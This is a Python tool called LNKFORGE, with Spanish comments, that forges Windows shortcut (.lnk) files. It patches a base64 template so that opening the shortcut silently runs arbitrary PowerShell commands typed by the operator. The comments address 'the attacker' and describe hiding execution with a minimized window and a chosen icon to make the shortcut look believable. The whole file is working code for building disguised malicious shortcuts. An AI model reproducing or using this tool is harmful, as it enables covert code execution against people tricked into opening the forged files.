import base64
import time
import json

# Varaible que contiene los bytes a ocupar dentro del lnk 45 son las veces que se repite la cadena A9AD0APQ en el
# base64 original, se genera de forma dinamica con la seccion de importar LNK propio
try:
    with open(".cfg_lnk", "r", encoding="utf-8") as read_json:
        
        all_json = json.loads(read_json.read())
        b64_extra_bytes = all_json["bytes_prev"] + all_json["target_"]*all_json["count_target"] + all_json["bytes_next"]

except:
    b64_extra_bytes = "ACAAIgAg"+"AD0APQA9"*45+"AD0APQAgACI"


# Varibale que limita el relleno de bytes
max_bytes = len(b64_extra_bytes)
buffer_ = ""

# Diccionario encargado de traducir el tipo de lnk a lineas especificadas en el archivo b64
json_lines = {

    "normal": 0,
    "minimal": 1,

    "normal-icon": 2,
    "minimal-icon" :3

}

# Variable tendra el valor de normal si no se usa el minimal
line_ = json_lines["normal"]

def settings_lnk():

    # Ingresamos el tipo de lnk a modificar
    try:
        print(""":: LNKFORGE :: =>> [INFO]
:: Estas en la ejecucion de ajustes de lnkforge, escribe una de estas opciones ::
:: para editar la opcion correspondiente a tu eleccion ::

    :: Opciones ::
    
    > minimal
      minimal-icon

    > normal
      normal-icon     
""")

        while True:

            my_lnk_edit = input("cmd_lnk_settings >> ")

            if my_lnk_edit not in json_lines:
                print(f"[INFO] No existe ningun LNK asociado a {my_lnk_edit} =>> [BAD]")
                continue
            
            if my_lnk_edit == "exit":
                return
            
            print(f"[ALERT] LNK file switched to {my_lnk_edit.upper()} =>> [OK]")

            my_lnk = json_lines[my_lnk_edit]
            my_new_lnk = input(f"{my_lnk_edit}_new_file_path >> ")

            break
    
    except KeyboardInterrupt:
        exit(0)

    except Exception as err:
        print(f"[ERROR] {err}")
        return

    try:
        with open(my_new_lnk, "rb") as lnk_to_encode:#, open("modular_lnk.b64", "w", encoding="utf-8") as save_line_in_modular:

            all_bytes = lnk_to_encode.read()
            encoded_lnk = base64.b64encode(all_bytes).decode().replace("=", "")

    except Exception as err:
        print(f"[ERROR] {err}")

    # Posibles firmas que representan el inicio del payload (comillas de apertura en base64)
    bytes_prev_pos = ["ACAAIgAg", "ACIAIA"]

    # Fragmentos que forman parte del bloque de padding en base64 (varias formas de '====')
    sing_ = ["AD0", "APQ", "A9"]

    # Lista temporal para almacenar las posiciones donde aparece cada fragmento en el texto
    to_num = []

    sum = 0

    try:
        # Obtenemos la posición de aparición de cada fragmento en el texto base64
        for ele in sing_:
            to_num.append(encoded_lnk.index(ele))

        # Determinamos cuál aparece primero (el de menor índice)
        trunc_ = min(to_num)

        # Extraemos 8 caracteres desde la posición del fragmento más cercano al inicio
        target_ = encoded_lnk[trunc_:trunc_+8]

        # Contamos cuántas veces se repite esa secuencia completa
        count_target = encoded_lnk.count(target_)

        # Dividimos el texto en dos partes, antes y después del bloque de padding repetido
        two_list_b64 = encoded_lnk.split(target_ * count_target)

        # Obtenemos los últimos 19 caracteres antes del bloque de padding (zona de apertura del payload)
        bytes_prev = two_list_b64[0][-19:]

        # Guardamos los bytes previos en una variable de cache para evitar problemas
        bytes_prev_cache = bytes_prev

        # Buscamos cuál de las firmas conocidas está presente en esa zona
        for elem in bytes_prev_pos:
            if elem in bytes_prev:
                bytes_prev = elem
                break

        if bytes_prev == bytes_prev_cache:
            print("[INFO] No se logro definir el inicio del PayLoad =>> [BAD]")
            return
        # Obtenemos los primeros 19 caracteres después del bloque (zona de cierre del payload)
        bytes_next = two_list_b64[1][:11]

        # Creamos una lista para guardar los fragmentos encontrados y su posición en el cierre
        previus_order_chain = []

        # Recorremos los posibles fragmentos para encontrar cuáles aparecen en la zona de cierre
        for byte_ in sing_:

            if byte_ in bytes_next:
            
                tem_index = bytes_next.index(byte_)
                previus_order_chain.append([byte_, tem_index])
                bytes_next = bytes_next.replace(byte_, "")  # Eliminamos la ocurrencia

        if previus_order_chain == []:
            print("[INFO] No se logro definir el final del PayLoad =>> [BAD]")
            return

        # Ordenamos los fragmentos según su posición
        previus_order_chain.sort()
        str_previus = ""

        # Unimos los fragmentos en una sola cadena
        for elem in previus_order_chain:
            str_previus = str_previus + elem[0]

        # Mostramos los resultados del análisis
        print(f"""
        ---------------------
-----------INFORME-DE-CONVERSION-----------
        ---------------------
:: Inicio de carga del Payload: {bytes_prev}
:: Cadena de bytes vacíos: {target_} x {count_target}
:: Previa final de carga: {str_previus}
:: Final de carga de payload: {bytes_next}
-------------------------------------------""")

        # Contamos cuántas veces aparece cada tipo de fragmento
        for elem in sing_:
            sum = sum + encoded_lnk.count(elem)

        print(f"[INFO] Total de caracteres permitidos =>> [{sum}]")

        # Reconstruimos el payload para su verificación o análisis
        total_str = bytes_prev + target_ * count_target + str_previus + bytes_next

        # Verificamos si el payload reconstruido existe en el texto base64
        if total_str not in encoded_lnk:
            print("[INFO] Formato incorrecto =>> [BAD]")
            return

        # Guardamos la configuracion del base64 en json
        with open(".cfg_lnk", "w", encoding="utf-8") as write_json:

            save_json = {
                
                "bytes_prev": bytes_prev,
                "target_": target_,
                "count_target": count_target,
                "bytes_next": str_previus+bytes_next
            }

            write_json.write(str(save_json).replace("'", '"'))

            print("[INFO] Configuracion generada guardada en =>> [.cfg_lnk]")

        try:
            with open("modular_lnk.b64", "r", encoding="utf-8") as read_:

                # Leemos todas las líneas del archivo
                file_all = read_.readlines()

                # Reemplazamos la linea que el usuario quiere personalizar
                file_all[my_lnk] = encoded_lnk

            # Abrimos el archivo nuevamente para reescribir la informacion con las lineas nuevas
            with open("modular_lnk.b64", "w", encoding="utf-8") as write_save:
                write_save.writelines(file_all)
            
            print("[INFO] Formato correcto y guardado en modular_lnk.b64 =>> [OK]")

        except Exception as err:
            print(f"[ERROR] {err}")

    except Exception as err:
        print(f"[ERROR] {err}")

"""
:: INFORMACION GENERAL ::

La variable b64_extra_bytes contiene un base64, que decodificandolo en UTF-16BE da como resultado
" ================================ "
Esto dentro del lnk, a la hora de crearlos, genera espacio dentro del propio programa, es decir
la memoria total que carga consigo dentro el lnk. Si no genero el espacio suficiente dentro de este "relleno" por asi decirlo,
los comandos se cortaran justo con el limitante de bytes necesarios para ejecutar. 

Por ejemplo, use los siguientes comandos en el programa:

- ls
- pause
- pwd
- systeminfo

Sin embargo, el lnk original del base64 que estamos usando solo contiene:

- ls
- pause

Lo que signifca que los siguientes comandos si bien pueden ejecutarse, se quedaran a la mitad
debido a la limitante de bytes en el formato original del LNK. Para evitar eso generamos un nuevo
lnk que ejecute powershell.

:: CREACION DEL ACCESO_DIRECTO.LNK PARA DEVS :: 

Para hacer mas creible el acceso directo se puede usar un template creado desde windows con estas
caracteristicas sin embargo se corrompe tras irrumpir la estructura original del LNK:

 - Ruta del acceso directo: C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -Command " ========================================================================================================================================= "
 - Icono a escoger
 - Pantalla: Minimizada (Para que no se vea al ejecutarse)

Luego con wsl o pasando el archivo a WSL con base 64 ejecutamos el siguiente comando:
 - base64 nombre.lnk > temp.txt

Una vez codificado a base64 necesitamos eliminar todos los saltos de linea del base64.
Copiamos el contenido del temp.txt y lo pegamos en: https://pinetools.com/es/eliminar-saltos-linea

Una vez limpiado, este archivo nos servira para ser utilizado en esta herramienta. Esto se hace
reemplazando el archivo original del template.

Eres libre de experimentar con el tamaño maximo de bytes que aceptan estos LNK corruptos desde Linux.
Digo "corruptos" porque siguen siendo funcionales a pesar de su modificacion tan "casera" hasta el momento
la sentencia mas larga es esta la cual consta de 137 caracteres que codificados a UTF-16BE son 274 bytes.

LNK desde windows, tiene un limite mayor al que se refiere en la interfaz grafica. Es decir
que si yo coloco muchos ======================================= " y haya terminado bien
con '= "' en el codigo base64 no se ve reflejado que este completo a pesar de tener cambios
como por ejemplo en extrabytes normal.

AD0: ES =
AD0APQ: ES ==
AD0APQA9: ES ===

!! "=" Esta codificado a UTF-16BE !!

Esta informacion es crucial para lograr comprender la estructura de donde se encuentra la cadena
a reemplazar por comandos embebidos.
"""

print(""":: LNKFORGE :: =>> [INFO]
:: Todo lo que escribas a continuacion quedara guardado como acceso directo ::
:: estos comandos se ejecutaran cuando abran el LNK dentro de la maquina ::
  
    > minimal      :: La ventana de comandos se ejecutara en minimizado.
      minimal-icon :: LNK minimizado con icono.

    > normal       :: La ventana de comandos se ejecutara en primer plano.
      normal-icon  :: LNK en primer plano con icono.

    :: ADD PERSONAL .LNK :: </>
    
    > personal-lnk :: Agrega tu LNK personalizado desde Windows.
""")

# Funcion encargada de devolver la longitud del b64 de los comandos, o codificada a base64 si lleva False
def check_len_or_save(commands_code, check_ = True):

    # Se le agregan las comillas dobles para que internamente el lnk valide -Command " buffer_ "
    total_commands = f' " {commands_code} " '

    # Si queremos obtener la cadena en base64, para evitar errores de ejecucion de codigo no aceptado en powershell
    # Reemplazamos el final de la cadena por un "#" para asi comentar el resto de comandos o caracteres corruptos
    if not check_:
        total_commands = total_commands.replace('; " ', ';#" ')

    var_return = base64.b64encode(total_commands.encode("UTF-16BE")).decode()

    if check_:
        return len(var_return)
    
    return var_return

# Entramos en un bulce que almacene el historial de comandos a ejecutar
while True:

    try:
        commands_ = input("cmd_lnk_executor >> ")

        # Si el comando es exit termina el bucle
        if commands_ == "exit":
            break

        if commands_ == "personal-lnk":
            settings_lnk()
        
        # Si el atacante quiere que no se vea la ejecucion en powershell se marca como True
        # y se salta esta iteracion
        if commands_ in json_lines:
            print(f"[ALERT] LNK file switched to {commands_.upper()} =>> [OK]")
            line_ = json_lines[commands_]
            continue

        # El historial de comandos a ejecutar separados por un ;
        buffer_ = buffer_ + commands_+";"

        if max_bytes <= check_len_or_save(buffer_, True):
            print(f"[INFO] Limites de {str(max_bytes)} bytes maximos excedidos en LNK =>> [SAVE]")

            # Creamos una lista con los comandos a ejecutar y obtenemos el ultimo comando agregado y lo reemplazamos del str
            buffer_tmp = buffer_.split(";")
            delete_command_out_bytes = buffer_tmp[len(buffer_tmp)-2]+";"

            buffer_ = buffer_.replace(delete_command_out_bytes, "")
            break
    
    except KeyboardInterrupt:
        exit(0)

    except Exception as err:
        print(f"[ERROR] {err}")

try:
    # Se obtiene la fecha y se da nombre al lnk si es que se guarda con el año el dia y minuto
    date_ = time.localtime()
    name_file_save = f"lnk_forged_{date_[0]}-{date_[2]}-{date_[4]}.lnk"

    # Se codifica el texto en UTF-16BE formato usado en powershell, para luego codificarlo a b64
    # y transformarlo a str con .decode ( porque es binario )
    code_ = check_len_or_save(buffer_, False)

    # Abrimos el archivo base de powershell que estamos usando para reemplazar la cadena b64_extra_bytes por el codigo 
    # en base64 de la variable code_, la cual contiene el codigo embebido a ejecutar
    with open("modular_lnk.b64", "r", encoding="utf-8") as read_ps_b64, open(name_file_save, "wb") as save_bytes_lnk:

        file_lines = read_ps_b64.readlines()[line_]

        # Aqui se obtiene el valor del diccionario, es decir que ocuparan por ejemplo: 0 para normal y 1 para ps minimizado
        all_b64 = file_lines.replace(b64_extra_bytes, code_).replace("=", "").strip()

        # Si el resto de la division de la cantidad total de caracteres del archivo 
        # tiene un resto, se debe de igualar la cadena con "=" dependiendo del caso
        for i in range(10):

            rest_ = len(all_b64) % 4

            if rest_ == 2:
                all_b64 = all_b64+"=="

            if rest_ == 3 or rest_ == 1:
                all_b64 = all_b64+"="

            # Intentamos decodifciar el base64
            try:
                base64.b64decode(all_b64)

            # Si nos da error, aumentamos el buffer para codificarlo de vuelta a base64 y asi
            # modificar tambien el padding hasta que coincida correctamente para decodificar
            except:
                buffer_ = " " + buffer_
                code_ = check_len_or_save(buffer_, False)
                all_b64 = file_lines.replace(b64_extra_bytes, code_).replace("=", "").strip()
            
            # Si todo sale bien, se termina
            else:
                break

        # Y se guarda el archivo lnk en binario
        save_bytes_lnk.write(base64.b64decode(all_b64))

        print(f"""
        ---------------------
-----------INFORME-DE-CONVERSION-----------
        ---------------------
:: Tamaño en txt original: {len(all_b64)}
:: Resto original: {rest_}
-------------------------------------------
:: Tamaño en txt ajustado: {len(all_b64)}
:: Resto resultante: {len(all_b64) % 4}
-------------------------------------------
[INFO] LNK guardado como {name_file_save} =>> [OK]""")

except Exception as err:
    print(f"[ERROR] {err}")